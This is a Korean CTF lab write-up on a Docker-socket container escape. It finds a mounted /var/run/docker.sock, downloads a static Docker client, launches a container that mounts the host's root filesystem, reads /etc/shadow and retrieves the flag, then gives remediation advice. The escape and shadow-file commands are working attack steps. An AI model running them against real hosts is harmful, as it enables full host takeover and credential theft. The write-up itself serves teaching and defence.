+++
title = "VulnABLE CTF [LUXORA] Write-up: Container Escape 🥈 Silver"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "Container Escape", "Silver", "Docker Socket", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: Container Escape 🥈 Silver

## 🎯 챌린지 개요
- **카테고리**: Infrastructure Layer (Container Escape)
- **난이도**: 🥈 Silver
- **타겟 경로**: 컨테이너 내부 쉘 확보 후 진행
- **목표**: 컨테이너 내부에 실수로 마운트된 **도커 소켓(Docker Socket, `/var/run/docker.sock`)**을 찾아내어, 컨테이너 안에서 도커 데몬을 조종하여 호스트 전체 권한을 가진 새로운 특권 컨테이너(Privileged Container)를 띄우고 탈출하라.

---

## 🕵️‍♂️ 1. 정보 수집 및 소켓 탐색 (Reconnaissance)

웹 쉘을 획득한 상태에서 컨테이너 내부를 정찰합니다.
이번에는 파일 시스템 전체를 검색하여 `.sock` 확장자를 가진 유닉스 도메인 소켓 파일이 있는지 찾습니다.

**[명령어]**
```bash
$ find / -name docker.sock 2>/dev/null
```

**[검색 결과]**
```text
/var/run/docker.sock
```

**[해커의 사고 과정]**
1. 맙소사, `/var/run/docker.sock` 이 컨테이너 안에 떡하니 존재한다!
2. 이 소켓은 호스트 OS에서 실행 중인 도커 데몬(Docker Daemon)과 통신하는 핵심 파이프라인이다.
3. 이 소켓에 명령을 보낼 수 있다는 것은, 호스트 OS의 `root` 권한을 가진 도커 데몬에게 "야, 새로운 컨테이너 하나 만들어!" 라고 명령할 수 있다는 뜻이다. (Docker-in-Docker 취약점)

---

## 💥 2. 취약점 식별 및 도커 클라이언트 준비 (Exploitation)

### 📊 공격 흐름도 (Attack Flow)

```text
[ Container (Web Shell) ]
|-- /var/run/docker.sock (Mounted)
|-- [ Docker CLI ] --(Deploy Privileged Container)--> [ Host OS ]
                                                      |-- Root Compromised!
```


도커 소켓을 사용하려면 도커 클라이언트(`docker` 명령어)나, HTTP API로 소켓과 직접 통신할 수 있는 도구(`curl`)가 필요합니다.

### 💡 컨테이너 내부에 Docker 바이너리 다운로드
현재 컨테이너에 `docker` 명령어가 설치되어 있지 않다면, 정적 빌드된(Static binary) 도커 클라이언트를 외부에서 다운로드받습니다.

```bash
# 정적 도커 바이너리 다운로드
$ wget https://download.docker.com/linux/static/stable/x86_64/docker-20.10.9.tgz
$ tar -xzf docker-20.10.9.tgz
$ cp docker/docker /tmp/docker
$ chmod +x /tmp/docker
```

이제 `/tmp/docker` 를 통해 호스트의 도커 데몬에 명령을 내릴 수 있습니다.

---

## 🚀 3. 공격 수행 및 Privileged 컨테이너 실행

호스트의 루트 파일 시스템(`/`)을 통째로 마운트한 새로운 우분투 컨테이너를 실행시킵니다. 

**[공격 명령어 실행]**
```bash
# -H 옵션으로 도커 소켓 지정
# -v /:/host_root 로 호스트의 모든 파일을 맵핑
# -it 옵션으로 쉘 접속
$ /tmp/docker -H unix:///var/run/docker.sock run -v /:/host_root -it ubuntu /bin/bash
```

*(참고: 만약 컨테이너 안이라 인터랙티브(`-it`) 모드가 불가능하다면, 쉘 스크립트를 넘기거나 리버스 쉘을 맺는 형태로 명령어를 변형합니다.)*

```bash
# 비동기적으로 호스트의 섀도우 비밀번호를 읽어 출력하는 예시
$ /tmp/docker -H unix:///var/run/docker.sock run -v /:/host_root ubuntu cat /host_root/etc/shadow
```

### 🔍 결과 확인
우리가 띄운 새로운 컨테이너가 성공적으로 만들어졌고, 이 컨테이너의 `/host_root` 폴더에 가면 럭소라 메인 서버(호스트)의 파일이 전부 다 있습니다!

호스트의 플래그 파일을 찾아냅니다.

```bash
$ cat /host_root/root/flag_host_silver.txt
FLAG{CONTAINER_🥈_DOCKER_SOCK_MOUNT_D4E5F6}
```

---

## 🚩 4. 롸잇업 결론 및 플래그

CI/CD 파이프라인(Jenkins, GitLab Runner)이나 모니터링 에이전트를 구축할 때 편의상 마운트하는 `docker.sock` 파일이, 사실상 시스템의 "마스터키"를 넘겨주는 행위임을 증명했습니다.

**🔥 획득한 플래그:**
`FLAG{CONTAINER_🥈_DOCKER_SOCK_MOUNT_D4E5F6}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
도커 데몬 소켓은 기본적으로 호스트 시스템의 `root` 권한과 완벽히 동일한 막강한 힘을 가집니다. 이를 컨테이너 내부에 노출하는 것은 절대적인 안티 패턴(Anti-Pattern)입니다.

* **안전한 패치 가이드 (Docker-in-Docker 대안 마련)**
1. **소켓 마운트 전면 금지**: `docker run -v /var/run/docker.sock:/var/run/docker.sock` 설정은 절대 금지되어야 합니다.
2. **원격 API (TLS 적용)**: 만약 컨테이너에서 다른 컨테이너를 제어해야 한다면, 소켓 마운트 대신 도커 데몬을 TCP 포트(예: 2376)로 열고, 상호 인증용 TLS 인증서(mTLS)를 발급하여 엄격하게 통신해야 합니다.
3. **Sysbox / Kaniko 사용**: CI/CD 목적으로 도커 컨테이너 안에서 이미지를 빌드해야 한다면(DinD), 루트 권한 없이 안전하게 격리된 환경을 제공하는 `Sysbox` 컨테이너 런타임이나 `Kaniko`, `Buildah` 같은 전문 빌드 도구를 사용해야 합니다.